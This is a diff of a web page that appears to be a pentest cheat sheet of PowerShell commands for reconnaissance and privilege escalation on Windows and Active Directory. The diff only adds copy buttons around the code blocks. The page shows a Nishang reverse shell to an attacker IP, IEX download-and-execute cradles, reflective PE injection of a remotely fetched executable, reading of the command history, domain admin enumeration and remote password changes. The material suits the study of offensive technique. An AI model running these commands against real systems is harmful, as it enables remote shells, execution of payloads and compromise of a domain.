@@ -390,32 +390,40 @@
               <h1 id="powershell">PowerShell</h1>
 <p>Some useful PowerShell commands that you can use during your recon or privsec phases.</p>
 <h2 id="execute-block-as-an-other-user">Execute block as an other user</h2>
-<pre><code class="language-powershell">$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
+<div class="clipboard-content">  <pre><code class="language-powershell">$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;dom&gt;\&lt;username&gt;&quot;, $pass)
 Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { cmd.exe &quot;/c &lt;cmd&gt;&quot; }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;dom&gt;\&lt;username&gt;&quot;, $pass)
+Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { cmd.exe &quot;/c &lt;cmd&gt;&quot; }
+">    Copy  </button></div></div>
 <h2 id="download-and-execute-script">Download and execute script</h2>
 <p>The repository <a href="https://github.com/samratashok/nishang" target="_blank">Nishang</a> contains a good
 PowerShell script to create a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">reverse shell</a>.
 You need to add the following line at the end:</p>
-<pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
+">    Copy  </button></div></div>
 <p>On your local machine:</p>
 <ul>
 <li>Create an HTTP server to serve the script: <code>python -m http.serve</code></li>
 <li>Listen for an incoming <a href="../reverse-shell/#listen-with-netcat">connection with nc</a>.</li>
 </ul>
 <p>On the remote host, execute the following PowerShell script:</p>
-<pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
+">    Copy  </button></div></div>
 <h2 id="reflectivepeinjection">ReflectivePEInjection</h2>
 <p>Start an executable from memory:</p>
-<pre><code class="language-powershell">IEX (New-Object System.Net.WebClient).DownloadString(&quot;https://security-tips.vincd.com/assets/Invoke-ReflectivePEInjection.ps1&quot;)
+<div class="clipboard-content">  <pre><code class="language-powershell">IEX (New-Object System.Net.WebClient).DownloadString(&quot;https://security-tips.vincd.com/assets/Invoke-ReflectivePEInjection.ps1&quot;)
 $ExeBytes = IWR &quot;http://&lt;ip&gt;:&lt;port&gt;/x.exe&quot; | Select-Object -ExpandProperty Content
 Invoke-ReflectivePEInjection -PEBytes $ExeBytes
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="IEX (New-Object System.Net.WebClient).DownloadString(&quot;https://security-tips.vincd.com/assets/Invoke-ReflectivePEInjection.ps1&quot;)
+$ExeBytes = IWR &quot;http://&lt;ip&gt;:&lt;port&gt;/x.exe&quot; | Select-Object -ExpandProperty Content
+Invoke-ReflectivePEInjection -PEBytes $ExeBytes
+">    Copy  </button></div></div>
 <h2 id="execute-c-dll-from-powershell">Execute C# DLL from Powershell</h2>
-<pre><code class="language-powershell"># Load a dll to Powershell
+<div class="clipboard-content">  <pre><code class="language-powershell"># Load a dll to Powershell
 [Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Service.dll&quot;)
 [Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Cryptography.dll&quot;)
 
@@ -425,20 +433,32 @@ Invoke-ReflectivePEInjection -PEBytes $ExeBytes
 # Instantiate a class and class a method
 $c = New-Object MyNamespace.Cryptography.MyCryptography
 $c.Decrypt(&quot;CIPHER_TEXT&quot;, [MyNamespace.Service.Config]::ApplicationKey())
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="# Load a dll to Powershell
+[Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Service.dll&quot;)
+[Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Cryptography.dll&quot;)
+
+# Call a public public static method
+[MyNamespace.Service.Config]::ApplicationKey()
+
+# Instantiate a class and class a method
+$c = New-Object MyNamespace.Cryptography.MyCryptography
+$c.Decrypt(&quot;CIPHER_TEXT&quot;, [MyNamespace.Service.Config]::ApplicationKey())
+">    Copy  </button></div></div>
 <h2 id="activedirectory-module-without-rsat">ActiveDirectory Module without RSAT</h2>
 <p>To use the <a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps" target="_blank">ActiveDirectory Module</a> you only need to import the dll <code>Microsoft.ActiveDirectory.Management.dll</code>.
 It located in the following folder on a system where <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools" target="_blank">RAST</a> is installed :</p>
-<pre><code class="language-none">C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\
+">    Copy  </button></div></div>
 <p>On the distant machine, you copy this dll then import it in Powershell:</p>
-<pre><code class="language-powershell">Import-Module .\Microsoft.ActiveDirectory.Management.dll
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">Import-Module .\Microsoft.ActiveDirectory.Management.dll
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="Import-Module .\Microsoft.ActiveDirectory.Management.dll
+">    Copy  </button></div></div>
 <h2 id="domain-commands">Domain commands</h2>
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
 <p>Here is snippets of Powershell commands to interact with AD LDAP. You can also
 use customize filters to get vulnerable users (<a href="../windows/#list-spn-accounts">SPN</a>, ...)</p>
-<pre><code class="language-powershell"># Helping functions
+<div class="clipboard-content">  <pre><code class="language-powershell"># Helping functions
 function Get-ADUserDirectoryEntry($user) {
     return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(samAccountName=$user))&quot;)).FindOne().GetDirectoryEntry()
 }
@@ -472,43 +492,89 @@ function Get-ADComputerByOS($operatingSystem) {
 # Get &quot;Domain admins&quot; users, be carefull the name may change depending on the DC lang
 $DomainAdmins = Get-ADGroupMembers(&quot;Domain Admins&quot;)
 foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samaccountname))&quot; }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="# Helping functions
+function Get-ADUserDirectoryEntry($user) {
+    return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(samAccountName=$user))&quot;)).FindOne().GetDirectoryEntry()
+}
+
+function Get-ADUserGroups($user) {
+    $userDirectoryEntry = Get-ADUserDirectoryEntry($user)
+    $groups = $userDirectoryEntry.memberOf
+
+    return $groups
+}
+
+function Get-ADGroupMembers($GroupName) {
+    if ($GroupName -like &quot;CN=*&quot;) {
+        $GroupDistinguishedName = $GroupName
+    } else {
+        # find the distinguished name from the group name
+        $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=Group)(cn=$GroupName))&quot;)).FindOne().GetDirectoryEntry().distinguishedName
+    }
+
+    # limited to the first 10k entries
+    $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(memberOf=$GroupDistinguishedName ))&quot;)).FindAll()
+
+    return $GroupMembers.properties
+}
+
+function Get-ADComputerByOS($operatingSystem) {
+    # https://ldapwiki.com/wiki/Active%20Directory%20Computer%20Related%20LDAP%20Query
+    return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(&amp;(&amp;(samAccountType=805306369)(objectCategory=computer)(operatingSystem=$operatingSystem*))))&quot;)).FindAll()
+}
+
+# Get &quot;Domain admins&quot; users, be carefull the name may change depending on the DC lang
+$DomainAdmins = Get-ADGroupMembers(&quot;Domain Admins&quot;)
+foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samaccountname))&quot; }
+">    Copy  </button></div></div>
 <h3 id="get-domain-password-policy">Get Domain Password Policy</h3>
-<pre><code class="language-powershell">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
+">    Copy  </button></div></div>
 <h3 id="get-user-owner">Get user owner</h3>
-<pre><code class="language-powershell">Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
+">    Copy  </button></div></div>
 <h3 id="list-deleted-users">List deleted users</h3>
-<pre><code class="language-powershell">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
+<div class="clipboard-content">  <pre><code class="language-powershell">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
 $objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter &quot;(objectClass=user)&quot; -IncludeDeletedObjects -properties *
 foreach ($object in $objects) { $object }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
+$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter &quot;(objectClass=user)&quot; -IncludeDeletedObjects -properties *
+foreach ($object in $objects) { $object }
+">    Copy  </button></div></div>
 <h2 id="miscellaneous-commands">Miscellaneous commands</h2>
 <h3 id="list-tcp-listening-connections">List TCP listening connections</h3>
 <p>The <a href="https://docs.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=win10-ps" target="_blank"><code>Get-NetTCPConnection</code></a>
 cmdlets lists TCP connections. By default the processes pid is return, so the
 following command line select the process name instead.</p>
-<pre><code class="language-powershell">Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
+">    Copy  </button></div></div>
 <h3 id="list-email-aliases">List Email aliases</h3>
-<pre><code class="language-powershell">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
+">    Copy  </button></div></div>
 <h3 id="get-powershell-command-history">Get PowerShell command history</h3>
-<pre><code class="language-powershell">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
+<div class="clipboard-content">  <pre><code class="language-powershell">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
 gc ConsoleHost_history.txt
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
+gc ConsoleHost_history.txt
+">    Copy  </button></div></div>
 <h3 id="convert-dacl">Convert DACL</h3>
-<pre><code class="language-powershell">$acl = get-acl HKLM:\System\CurrentControlSet\Services
+<div class="clipboard-content">  <pre><code class="language-powershell">$acl = get-acl HKLM:\System\CurrentControlSet\Services
 ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$acl = get-acl HKLM:\System\CurrentControlSet\Services
+ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
+">    Copy  </button></div></div>
 <h3 id="set-password-remotely">Set Password Remotely</h3>
 <p>This <a href="../assets/Set-PasswordRemotely.ps1">script</a> change the password of a user
 on a remote forest.</p>
-<pre><code class="language-powershell">Set-PasswordRemotely {USERNAME} {DOMAIN}
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">Set-PasswordRemotely {USERNAME} {DOMAIN}
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="Set-PasswordRemotely {USERNAME} {DOMAIN}
+">    Copy  </button></div></div>
 <h3 id="list-certificates">List Certificates</h3>
-<pre><code class="language-powershell">$NamingContext = &quot;DC=corpo,DC=lan&quot;
+<div class="clipboard-content">  <pre><code class="language-powershell">$NamingContext = &quot;DC=corpo,DC=lan&quot;
 
 $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://CN=Configuration,$NamingContext&quot;)
 $adSearcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry, &quot;(distinguishedName=CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,$NamingContext)&quot;)
@@ -522,9 +588,23 @@ Foreach ($rawByte in $cacertificates) {
     $issuerName = [System.Text.Encoding]::Default.GetString($cacertificate.IssuerName.RawData)
     $signatureAlgorithm = $cacertificate.SignatureAlgorithm.FriendlyName
 }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$NamingContext = &quot;DC=corpo,DC=lan&quot;
+
+$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://CN=Configuration,$NamingContext&quot;)
+$adSearcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry, &quot;(distinguishedName=CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,$NamingContext)&quot;)
+$NTAuthCertificates = $adSearcher.FindOne()
+$cacertificates = $NTAuthCertificates.Properties.cacertificate
+
+Foreach ($rawByte in $cacertificates) {
+    $cacertificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]$rawByte
+
+    $subjectName = [System.Text.Encoding]::Default.GetString($cacertificate.SubjectName.RawData)
+    $issuerName = [System.Text.Encoding]::Default.GetString($cacertificate.IssuerName.RawData)
+    $signatureAlgorithm = $cacertificate.SignatureAlgorithm.FriendlyName
+}
+">    Copy  </button></div></div>
 <h3 id="list-inactive-computers">List inactive computers</h3>
-<pre><code class="language-powershell">$computers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(&amp;(samAccountType=805306369)(objectCategory=computer)))&quot;)).FindAll()
+<div class="clipboard-content">  <pre><code class="language-powershell">$computers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(&amp;(samAccountType=805306369)(objectCategory=computer)))&quot;)).FindAll()
 
 $inactiveDays = 180
 $limit = (Get-Date).AddDays(-1 * $inactiveDays)
@@ -539,11 +619,26 @@ foreach($computer in $computers) {
         Add-Content $path &quot;$($c.Properties.name),$($pwdlastset),$($lastlogontimestamp),$($c.Properties.operatingsystem)&quot;
     }
 }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$computers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(&amp;(samAccountType=805306369)(objectCategory=computer)))&quot;)).FindAll()
+
+$inactiveDays = 180
+$limit = (Get-Date).AddDays(-1 * $inactiveDays)
+$path = &quot;C:\Temp\Inactive_Computers_$($inactiveDays)days.csv&quot;
+
+foreach($computer in $computers) {
+    $c = $computer
+    $lastlogontimestamp = [datetime]::FromFileTime($c.Properties.lastlogontimestamp[0])
+    $pwdlastset = [datetime]::FromFileTime($c.Properties.pwdlastset[0])
+
+    if ($lastlogontimestamp -lt $limit) {
+        Add-Content $path &quot;$($c.Properties.name),$($pwdlastset),$($lastlogontimestamp),$($c.Properties.operatingsystem)&quot;
+    }
+}
+">    Copy  </button></div></div>
 <h3 id="list-gpo">List GPO</h3>
 <p>The following script use the <code>DirectorySearcher</code> module to search for all the GPO
 on the current domain. The cmdlet <a href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=win10-ps" target="_blank"><code>Get-GPO</code></a> could also be used.</p>
-<pre><code class="language-powershell"># https://gallery.technet.microsoft.com/scriptcenter/Get-GroupPolicyObject-05aaef2d
+<div class="clipboard-content">  <pre><code class="language-powershell"># https://gallery.technet.microsoft.com/scriptcenter/Get-GroupPolicyObject-05aaef2d
 
 $GPOSearcher = New-Object DirectoryServices.DirectorySearcher -Property @{
     Filter = '(objectClass=groupPolicyContainer)'
@@ -557,10 +652,25 @@ $GPOSearcher.FindAll() | ForEach-Object {
         'FilePath' = $_.properties.gpcfilesyspath -join ''
     } | Select-Object -Property DisplayName,CommonName,FilePath,DistinguishedName
 }
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="# https://gallery.technet.microsoft.com/scriptcenter/Get-GroupPolicyObject-05aaef2d
+
+$GPOSearcher = New-Object DirectoryServices.DirectorySearcher -Property @{
+    Filter = '(objectClass=groupPolicyContainer)'
+    PageSize = 100
+}
+$GPOSearcher.FindAll() | ForEach-Object {
+    New-Object -TypeName PSCustomObject -Property @{
+        'DisplayName' = $_.properties.displayname -join ''
+        'DistinguishedName' = $_.properties.distinguishedname -join ''
+        'CommonName' = $_.properties.cn -join ''
+        'FilePath' = $_.properties.gpcfilesyspath -join ''
+    } | Select-Object -Property DisplayName,CommonName,FilePath,DistinguishedName
+}
+">    Copy  </button></div></div>
 <p>To get the permissions on a GPO, you can use the cmdlet <a href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gppermission?view=win10-ps" target="_blank"><code>Get-GPPermission</code></a>:</p>
-<pre><code class="language-powershell">Get-GPPermission -Name &quot;GPO_NAME&quot; -All
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-powershell">Get-GPPermission -Name &quot;GPO_NAME&quot; -All
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="Get-GPPermission -Name &quot;GPO_NAME&quot; -All
+">    Copy  </button></div></div>
             
           </div>
           <footer>
